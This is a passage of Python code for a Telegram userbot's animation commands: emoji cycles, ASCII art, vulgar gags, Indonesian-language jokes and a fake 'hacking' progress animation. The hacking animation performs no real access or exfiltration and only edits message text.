    format_heart = joined_heart.replace(R, "{}")
    for _ in range(5):
        heart = format_heart.format(*random.choices(ALL, k=heartlet_len))
        await _wrap_edit(message, heart)
        await asyncio.sleep(SLEEP)


async def phase3(message):
    """Fill up heartlet matrix"""
    await _wrap_edit(message, joined_heart)
    await asyncio.sleep(SLEEP * 2)
    repl = joined_heart
    for _ in range(joined_heart.count(W)):
        repl = repl.replace(W, R, 1)
        await _wrap_edit(message, repl)
        await asyncio.sleep(SLEEP)


async def phase4(message):
    """Matrix shrinking"""
    for i in range(7, 0, -1):
        heart_matrix = "\n".join([R * i] * i)
        await _wrap_edit(message, heart_matrix)
        await asyncio.sleep(SLEEP)
from collections import deque

emojis = {
    "moon": list("🌗🌘🌑🌒🌓🌔🌕🌖"),
    "clock": list("🕙🕘🕗🕖🕕🕔🕓🕒🕑🕐🕛"),
    "thunder": list("☀️🌤️⛅🌥️☁️🌩️🌧️⛈️⚡🌩️🌧️🌦️🌥️⛅🌤️☀️"),
    "earth": list("🌏🌍🌎🌎🌍🌏🌍🌎"),
    "heart": list("❤️🧡💛💚💙💜🖤"),
}
emoji_commands = [x for x in emojis]


@app.on_message(filters.command(emoji_commands, ".") & filters.me)
async def emoji_cycle(app, message: Message):
    deq = deque(emojis[message.command[0]])
    try:
        for _ in range(randint(16, 32)):
            await asyncio.sleep(0.3)
            await message.edit("".join(deq), parse_mode=None)
            deq.rotate(1)
    except Exception:
        await message.delete()
@app.on_message(
    filters.me & (filters.command(["loveyou"], ".") | filters.regex("^loveyou "))
)
async def _(app, message: Message):
    noble = random.randint(1, len(NOBLE) - 2)
    reply_text = NOBLE[noble]
    await edit_or_reply(message, reply_text)
@app.on_message(filters.command("hmm", ".") & filters.me)
async def hello_world(app, message: Message):
    mg = await edit_or_reply(
        message,
        "┈┈╱▔▔▔▔▔╲┈┈┈HM┈HM\n┈╱┈┈╱▔╲╲╲▏┈┈┈HMMM\n╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈\n▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈\n▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈\n╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈\n┈╲┈┈▏╭━━━━╯▕▕┈┈┈\n┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈\n┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲\n┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲\n┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕\n┈▏┈┈┈╰┈┈┈┈╯┈┈┈▕▕\n┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲\n┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏\n┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔\n┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈ ",
    )


@app.on_message(
    filters.me & (filters.command(["ahh"], ".") | filters.regex("^ahh "))
)
async def hello_world(app, message: Message):
    mg = await edit_or_reply(message, "ahh")
    await asyncio.sleep(0.2)
    await mg.edit("aahh")
    await asyncio.sleep(0.2)
    await mg.edit("aahhh")
    await asyncio.sleep(0.2)
    await mg.edit("aahhhh")
    await asyncio.sleep(0.2)
    await mg.edit("aahhhhh")
    await asyncio.sleep(0.2)
    await mg.edit("aahhhhhh")
    await asyncio.sleep(0.2)
    await mg.edit("aahhhhhhh")
    await asyncio.sleep(0.2)
    await mg.edit("aaahhhhhhhh")


@app.on_message(filters.command("brain", ".") & filters.me)
async def pijtau(app, message: Message):
    if message.forward_from:
        return
    animation_interval = 1
    animation_ttl = range(0, 14)
    await message.edit("brain")
    animation_chars = [
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠         <(^_^ <)🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠       <(^_^ <)  🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠     <(^_^ <)    🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠   <(^_^ <)      🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠 <(^_^ <)        🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠<(^_^ <)         🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n(> ^_^)>🧠         🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n  (> ^_^)>🧠       🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n    (> ^_^)>🧠     🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n      (> ^_^)>🧠   🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n        (> ^_^)>🧠 🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n          (> ^_^)>🧠🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           (> ^_^)>🗑",
        "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           <(^_^ <)🗑",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await message.edit(animation_chars[i % 14])


@app.on_message(filters.command("bomb", ".") & filters.me)
async def gahite(app, message: Message):
    if message.forward_from:
        return
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await message.edit("💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await message.edit("▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n")
    await asyncio.sleep(1)
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💥💥💥💥 \n")
    await asyncio.sleep(0.5)
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💥💥💥💥 \n💥💥💥💥 \n")
    await asyncio.sleep(0.5)
    await message.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n😵😵😵😵 \n")
    await asyncio.sleep(0.5)
    await message.edit("`RIP PLOXXX......`")
    await asyncio.sleep(2)


@app.on_message(filters.command("call", ".") & filters.me)
async def hajqag(app, message: Message):
    if message.forward_from:
        return
    animation_interval = 3
    animation_ttl = range(0, 18)
    await message.edit("Calling Pavel Durov (ceo of telegram)......")
    animation_chars = [
        "`Connecting To Telegram Headquarters...`",
        "`Call Connected.`",
        "`Telegram: Hello This is Telegram HQ. Who is this?`",
        f"`Me: Yo this is` {DEFAULTUSER} ,`Please Connect me to my lil bro,Pavel Durov `",
        "`User Authorised.`",
        "`Calling Saitama`  `At +916969696969`",
        "`Private  Call Connected...`",
        "`Me: Hello Sir, Please Ban This Telegram Account.`",
        "`Saitama : May I Know Who Is This?`",
        f"`Me: Yo Brah, I Am` {DEFAULTUSER} ",
        "`Saitama : OMG!!! Long time no see, Wassup cat...\nI'll Make Sure That Guy Account Will Get Blocked Within 24Hrs.`",
        "`Me: Thanks, See You Later Brah.`",
        "`Saitama : Please Don't Thank Brah, Telegram Is Our's. Just Gimme A Call When You Become Free.`",
        "`Me: Is There Any Issue/Emergency???`",
        "`Saitama : Yes Sur, There Is A Bug In Telegram v69.6.9.\nI Am Not Able To Fix It. If Possible, Please Help Fix The Bug.`",
        "`Me: Send Me The App On My Telegram Account, I Will Fix The Bug & Send You.`",
        "`Saitama : Sure Sur \nTC Bye Bye :)`",
        "`Private Call Disconnected.`",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await message.edit(animation_chars[i % 18])
@app.on_message(filters.command("wtf", ".") & filters.me)
async def gagahkah(app, message: Message):
    if message.forward_from:
        return
    animation_interval = 0.8
    animation_ttl = range(0, 5)
    await message.edit("wtf")
    animation_chars = [
        "What",
        "What The",
        "What The F",
        "What The F Brah",
        "[𝗪𝗵𝗮𝘁 𝗧𝗵𝗲 𝗙 𝗕𝗿𝗮𝗵](https://telegra.ph//file/f3b760e4a99340d331f9b.jpg)",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await message.edit(animation_chars[i % 5])


@app.on_message(filters.command("ding", ".") & filters.me)
async def gkahgagw(app, message: Message):
    animation_interval = 0.3
    animation_ttl = range(0, 30)
    animation_chars = [
        "🔴⬛⬛⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
        "⬜⬜⬛⬜⬜\n⬜⬛⬜⬜⬜\n🔴⬜⬜⬜⬜",
        "⬜⬜⬛⬜⬜\n⬜⬜⬛⬜⬜\n⬜⬜🔴⬜⬜",
        "⬜⬜⬛⬜⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜⬜🔴",
        "⬜⬜⬛⬛🔴\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
        "⬜⬜⬛⬜⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜⬜🔴",
        "⬜⬜⬛⬜⬜\n⬜⬜⬛⬜⬜\n⬜⬜🔴⬜⬜",
        "⬜⬜⬛⬜⬜\n⬜⬛⬜⬜⬜\n🔴⬜⬜⬜⬜",
        "🔴⬛⬛⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
        "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜\n⬜\n⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜",
    ]
    if message.forward_from:
        return
    await message.edit("ding..dong..ding..dong ...")
    await asyncio.sleep(4)
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await message.edit(animation_chars[i % 10])


@app.on_message(filters.command("hypo", ".") & filters.me)
async def okihakga(app, message: Message):
    if message.forward_from:
        return
    animation_interval = 0.3
    animation_ttl = range(0, 15)
    await message.edit("hypo....")
    animation_chars = [
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬛⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬛⬛⬛⬜⬜\n⬜⬜⬛⬜⬛⬜⬜\n⬜⬜⬛⬛⬛⬜⬜\n⬜⬜⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬛⬛⬛⬛⬛⬛",
        "⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛",
        "⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛⬜",
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬜⬛⬛⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬛⬛⬜⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬛⬛⬛⬛⬛⬛",
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬛⬛⬛⬛⬛⬛⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬜⬛⬛⬛⬜⬛\n⬛⬜⬛⬜⬛⬜⬛\n⬛⬜⬛⬛⬛⬜⬛\n⬛⬜⬜⬜⬜⬜⬛\n⬛⬛⬛⬛⬛⬛⬛",
        "⬜⬜⬜⬜⬜⬜⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬜⬛⬜⬛⬜\n⬜⬛⬜⬜⬜⬛⬜\n⬜⬛⬛⬛⬛⬛⬜\n⬜⬜⬜⬜⬜⬜⬜",
        "⬛⬛⬛⬛⬛\n⬛⬜⬜⬜⬛\n⬛⬜⬛⬜⬛\n⬛⬜⬜⬜⬛\n⬛⬛⬛⬛⬛",
        "⬜⬜⬜\n⬜⬛⬜\n⬜⬜⬜",
        "[👉🔴👈])",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await message.edit(animation_chars[i % 15])


@app.on_message(filters.command(["gangsta", "gang", "gangstar"], ".") & filters.me)
async def gajjajay(app, message: Message):
    await message.edit("EVERyBOdy")
    await asyncio.sleep(0.3)
    await message.edit("iZ")
    await asyncio.sleep(0.2)
    await message.edit("GangSTur")
    await asyncio.sleep(0.5)
    await message.edit("UNtIL ")
    await asyncio.sleep(0.2)
    await message.edit("I")
    await asyncio.sleep(0.3)
    await message.edit("ArRivE")
    await asyncio.sleep(0.3)
    await message.edit("🔥🔥🔥")
    await asyncio.sleep(0.3)
    await message.edit("EVERyBOdy iZ GangSTur UNtIL I ArRivE 🔥🔥🔥")


@app.on_message(filters.command("charging", ".") & filters.me)
async def timer_blankx(app, message: Message):
    txt = (
        message.text[10:]
        + "\n\n`Tesla Wireless Charging (beta) Started...\nDevice Detected: Nokia 1100\nBattery Percentage:` "
    )
    j = 10
    k = j
    for j in range(j):
        await message.edit(txt + str(k))
        k = k + 10
        await asyncio.sleep(1)
    await asyncio.sleep(1)
    await message.edit(
        "`Tesla Wireless Charging (beta) Completed...\nDevice Detected: Nokia 1100 (Space Grey Varient)\nBattery Percentage:` [100%](https://telegra.ph/file/a45aa7450c8eefed599d9.mp4) ",
        link_preview=True,
    )


@app.on_message(filters.command(["koc", "kocok"], ".") & filters.me)
async def kocok(app, message: Message):
    e = await edit_or_reply(message, "8✊===D")
    await e.edit("8=✊==D")
    await e.edit("8==✊=D")
    await e.edit("8===✊D")
    await e.edit("8==✊=D")
    await e.edit("8=✊==D")
    await e.edit("8✊===D")
    await e.edit("8=✊==D")
    await e.edit("8==✊=D")
    await e.edit("8===✊D")
    await e.edit("8==✊=D")
    await e.edit("8=✊==D")
    await e.edit("8✊===D")
    await e.edit("8=✊==D")
    await e.edit("8==✊=D")
    await e.edit("8===✊D")
    await e.edit("8==✊=D")
    await e.edit("8=✊==D")
    await e.edit("8===✊D💦")
    await e.edit("8==✊=D💦💦")
    await e.edit("8=✊==D💦💦💦")
    await e.edit("8✊===D💦💦💦💦")
    await e.edit("8===✊D💦💦💦💦💦")
    await e.edit("8==✊=D💦💦💦💦💦💦")
    await e.edit("8=✊==D💦💦💦💦💦💦💦")
    await e.edit("8✊===D💦💦💦💦💦💦💦💦")
    await e.edit("8===✊D💦💦💦💦💦💦💦💦💦")
    await e.edit("8==✊=D💦💦💦💦💦💦💦💦💦💦")
    await e.edit("8=✊==D Lah Kok Habis?")
    await e.edit("😭😭😭😭")


@app.on_message(filters.command(["fuck", "fucek"], ".") & filters.me)
async def ngefuck(app, message: Message):
    e = await edit_or_reply(message, ".                       /¯ )")
    await e.edit(".                       /¯ )\n                      /¯  /")
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /"
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸"
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸\n          /'/   /    /       /¨¯\\ "
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸\n          /'/   /    /       /¨¯\\ \n        ('(   (   (   (  ¯~/'  ')"
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸\n          /'/   /    /       /¨¯\\ \n        ('(   (   (   (  ¯~/'  ')\n         \\                        /"
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸\n          /'/   /    /       /¨¯\\ \n        ('(   (   (   (  ¯~/'  ')\n         \\                        /\n          \\                _.•´"
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸\n          /'/   /    /       /¨¯\\ \n        ('(   (   (   (  ¯~/'  ')\n         \\                        /\n          \\                _.•´\n            \\              ("
    )
    await e.edit(
        ".                       /¯ )\n                      /¯  /\n                    /    /\n              /´¯/'   '/´¯¯`•¸\n          /'/   /    /       /¨¯\\ \n        ('(   (   (   (  ¯~/'  ')\n         \\                        /\n          \\                _.•´\n            \\              (\n              \\  "
    )


@app.on_message(filters.command("hack", ".") & filters.me)
async def hak(app, message: Message):
    await message.edit_text("Looking for WhatsApp databases in targeted person...")
    await asyncio.sleep(2)
    await message.edit_text(
        " User online: True\nTelegram access: True\nRead Storage: True "
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 0%\n[░░░░░░░░░░░░░░░░░░░░]\n`Looking for WhatsApp...`\nETA: 0m, 20s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 11.07%\n[██░░░░░░░░░░░░░░░░░░]\n`Looking for WhatsApp...`\nETA: 0m, 18s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 20.63%\n[███░░░░░░░░░░░░░░░░░]\n`Found folder C:/WhatsApp`\nETA: 0m, 16s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 34.42%\n[█████░░░░░░░░░░░░░░░]\n`Found folder C:/WhatsApp`\nETA: 0m, 14s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 42.17%\n[███████░░░░░░░░░░░░░]\n`Searching for databases`\nETA: 0m, 12s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 55.30%\n[█████████░░░░░░░░░░░]\n`Found msgstore.db.crypt12`\nETA: 0m, 10s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 64.86%\n[███████████░░░░░░░░░]\n`Found msgstore.db.crypt12`\nETA: 0m, 08s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 74.02%\n[█████████████░░░░░░░]\n`Trying to Decrypt...`\nETA: 0m, 06s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 86.21%\n[███████████████░░░░░]\n`Trying to Decrypt...`\nETA: 0m, 04s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 93.50%\n[█████████████████░░░]\n`Decryption successful!`\nETA: 0m, 02s"
    )
    await asyncio.sleep(2)
    await message.edit_text(
        "Hacking... 100%\n[████████████████████]\n`Scanning file...`\nETA: 0m, 00s"
    )
    await asyncio.sleep(2)
    await message.edit_text("Hacking complete!\nUploading file...")
    await asyncio.sleep(2)
    await message.edit_text(
        "Targeted Account Hacked...!\n\n ✅ File has been successfully uploaded to my server.\nWhatsApp Database:\n`./DOWNLOADS/msgstore.db.crypt12`"
    )


@app.on_message(filters.command("dino", ".") & filters.me)
async def adadino(app, message: Message):
    typew = await edit_or_reply(message, "`DIN DINNN.....`")
    await asyncio.sleep(1)
    await typew.edit("`DINOOOOSAURUSSSSS!!`")
    await asyncio.sleep(1)
    await typew.edit("`🏃                        🦖`")
    await typew.edit("`🏃                       🦖`")
    await typew.edit("`🏃                      🦖`")
    await typew.edit("`🏃                     🦖`")
    await typew.edit("`🏃   `LARII`          🦖`")
    await typew.edit("`🏃                   🦖`")
    await typew.edit("`🏃                  🦖`")
    await typew.edit("`🏃                 🦖`")
    await typew.edit("`🏃                🦖`")
    await typew.edit("`🏃               🦖`")
    await typew.edit("`🏃              🦖`")
    await typew.edit("`🏃             🦖`")
    await typew.edit("`🏃            🦖`")
    await typew.edit("`🏃           🦖`")
    await typew.edit("`🏃WOARGH!   🦖`")
    await typew.edit("`🏃           🦖`")
    await typew.edit("`🏃            🦖`")
    await typew.edit("`🏃             🦖`")
    await typew.edit("`🏃              🦖`")
    await typew.edit("`🏃               🦖`")
    await typew.edit("`🏃                🦖`")
    await typew.edit("`🏃                 🦖`")
    await typew.edit("`🏃                  🦖`")
    await typew.edit("`🏃                   🦖`")
    await typew.edit("`🏃                    🦖`")
    await typew.edit("`🏃                     🦖`")
    await typew.edit("`??  Huh-Huh           🦖`")
    await typew.edit("`🏃                   🦖`")
    await typew.edit("`🏃                  🦖`")
    await typew.edit("`🏃                 🦖`")
    await typew.edit("`🏃                🦖`")
    await typew.edit("`🏃               🦖`")
    await typew.edit("`🏃              🦖`")
    await typew.edit("`🏃             🦖`")
    await typew.edit("`🏃            🦖`")
    await typew.edit("`🏃           🦖`")
    await typew.edit("`🏃          🦖`")
    await typew.edit("`🏃         🦖`")
    await typew.edit("`DIA SEMAKIN MENDEKAT!!!`")
    await asyncio.sleep(1)
    await typew.edit("`🏃       🦖`")
    await typew.edit("`🏃      🦖`")
    await typew.edit("`🏃     🦖`")
    await typew.edit("`🏃    🦖`")
    await typew.edit("`Dahlah Pasrah Aja`")
    await asyncio.sleep(1)
    await typew.edit("`🧎🦖`")
    await asyncio.sleep(2)
    await typew.edit("`-TAMAT-`")


@app.on_message(filters.command(["sayang", "syg"], ".") & filters.me)
async def zeyenk(app, message: Message):
    e = await edit_or_reply(message, "I LOVEE YOUUU 💕")
    await e.edit("💝💘💓💗")
    await e.edit("💞💕💗💘")
    await e.edit("💝💘💓💗")
    await e.edit("💞💕💗💘")
    await e.edit("💘💞💗💕")
    await e.edit("💘💞💕💗")
    await e.edit("SAYANG KAMU 💝💖💘")
    await e.edit("💝💘💓💗")
    await e.edit("💞💕💗💘")
    await e.edit("💘💞💕💗")
    await e.edit("SAYANG")
    await e.edit("KAMU")
    await e.edit("SELAMANYA 💕")
    await e.edit("💘💘💘💘")
    await e.edit("SAYANG")
    await e.edit("KAMU")
    await e.edit("SAYANG")
    await e.edit("KAMU")
    await e.edit("I LOVE YOUUUU")
    await e.edit("MY BABY")
    await e.edit("💕💞💘💝")
    await e.edit("💘💕💞💝")
    await e.edit("SAYANG KAMU💞")


@app.on_message(filters.command("gabut", ".") & filters.me)
async def menggabut(app, message: Message):
    e = await edit_or_reply(message, "`PERNAAHHHHH KAHHH KAUUU MENGIRA`")
    await e.edit("`SEPEEERTIIIII APAAAA BENTUKKKKKKK CINTAAAA`")
    await e.edit("`RAMBUUUT WARNAAA WARNII`")
    await e.edit("`BAGAI GULALI`")
    await e.edit("`IMUUUTTTTT LUCUUU`")
    await e.edit("`WALAAUUUU TAK TERLALU TINGGI`")
    await e.edit("`GW GABUUTTTT`")
    await e.edit("`EMMMM BACOTNYA`")
    await e.edit("`GABUTTTT WOI GABUT`")
    await e.edit("🙈🙈🙈🙈")
    await e.edit("🙉🙉🙉🙉")
    await e.edit("🙈🙈🙈🙈")
    await e.edit("🙉🙉🙉🙉")
    await e.edit("`CILUUUKKK BAAAAA`")
    await e.edit("🙉🙉🙉🙉")
    await e.edit("🐢                       🚶")
    await e.edit("🐢                      🚶")
    await e.edit("🐢                     🚶")
    await e.edit("🐢                    🚶")
    await e.edit("🐢                   🚶")
    await e.edit("🐢                  🚶")
    await e.edit("🐢                 🚶")
    await e.edit("🐢                🚶")
    await e.edit("🐢               🚶")
    await e.edit("🐢              🚶")
    await e.edit("🐢             🚶")
    await e.edit("🐢            🚶")
    await e.edit("🐢           🚶")
    await e.edit("🐢          🚶")
    await e.edit("🐢         🚶")
    await e.edit("🐢        🚶")
    await e.edit("🐢       🚶")
    await e.edit("🐢      🚶")
    await e.edit("🐢     🚶")
    await e.edit("🐢    🚶")
    await e.edit("🐢   🚶")
    await e.edit("🐢  🚶")
    await e.edit("🐢 🚶")
    await e.edit("🐢🚶")
    await asyncio.sleep(1)
    await e.edit("🚶🐢")
    await e.edit("🚶 🐢")
    await e.edit("🚶  🐢")
    await e.edit("🚶   🐢")
    await e.edit("🚶    🐢")
    await e.edit("🚶     🐢")
    await e.edit("🚶      🐢")
    await e.edit("🚶       🐢")
    await e.edit("🚶        🐢")
    await e.edit("🚶         🐢")
    await e.edit("🚶          🐢")
    await e.edit("🚶           🐢")
    await e.edit("🚶            🐢")
    await e.edit("🚶             🐢")
    await e.edit("🚶              🐢")
    await e.edit("🚶               🐢")
    await e.edit("🚶                🐢")
    await e.edit("🚶                 🐢")
    await e.edit("🚶                  🐢")
    await e.edit("🚶                   🐢")
    await e.edit("🚶                    🐢")
    await e.edit("🚶                     🐢")
    await e.edit("🚶                      🐢")
    await e.edit("🚶                       🐢")
    await e.edit("🚶                        🐢")
    await e.edit("🚶                         🐢")
    await e.edit("🚶                          🐢")
    await e.edit("🚶                           🐢")
    await e.edit("🚶                            🐢")
    await e.edit("🚶                             🐢")
    await e.edit("🚶                              🐢")
    await e.edit("🚶                               🐢")
    await e.edit("🚶                                🐢")
    await e.edit("🚶                                 🐢")
    await e.edit("`AHHH MANTAP`")
    await e.edit("🙉")
    await e.edit("🙈")
    await e.edit("🙉")
    await e.edit("🙈")
    await e.edit("🙉")
    await e.edit("😂")
    await e.edit("🐢                       🚶")
    await e.edit("🐢                      🚶")
    await e.edit("🐢                     🚶")
    await e.edit("🐢                    🚶")
    await e.edit("🐢                   🚶")
    await e.edit("🐢                  🚶")
    await e.edit("🐢                 🚶")
    await e.edit("🐢                🚶")
    await e.edit("🐢               🚶")
    await e.edit("🐢              🚶")
    await e.edit("🐢             🚶")
    await e.edit("🐢            🚶")
    await e.edit("🐢           🚶")
    await e.edit("🐢          🚶")
    await e.edit("🐢         🚶")
    await e.edit("🐢        🚶")
    await e.edit("🐢       🚶")
    await e.edit("🐢      🚶")
    await e.edit("🐢     🚶")
    await e.edit("🐢    🚶")
    await e.edit("🐢   🚶")
    await e.edit("🐢  🚶")
    await e.edit("🐢 🚶")
    await e.edit("🐢🚶")
    await asyncio.sleep(1)
    await e.edit("🚶🐢")
    await e.edit("🚶 🐢")
    await e.edit("🚶  🐢")
    await e.edit("🚶   🐢")
    await e.edit("🚶    🐢")
    await e.edit("🚶     🐢")
    await e.edit("🚶      🐢")
    await e.edit("🚶       🐢")
    await e.edit("🚶        🐢")
    await e.edit("🚶         🐢")
    await e.edit("🚶          🐢")
    await e.edit("🚶           🐢")
    await e.edit("🚶            🐢")
    await e.edit("🚶             🐢")
    await e.edit("🚶              🐢")
    await e.edit("🚶               🐢")
    await e.edit("🚶                🐢")
    await e.edit("🚶                 🐢")
    await e.edit("🚶                  🐢")
    await e.edit("🚶                   🐢")
    await e.edit("🚶                    🐢")
    await e.edit("🚶                     🐢")
    await e.edit("🚶                      🐢")
    await e.edit("🚶                       🐢")
    await e.edit("🚶                        🐢")
    await e.edit("🚶                         🐢")
    await e.edit("🚶                          🐢")
    await e.edit("🚶                           🐢")
    await e.edit("🚶                            🐢")
    await e.edit("🚶                             🐢")
    await e.edit("🚶                              🐢")
    await e.edit("🚶                               🐢")
    await e.edit("🚶                                🐢")
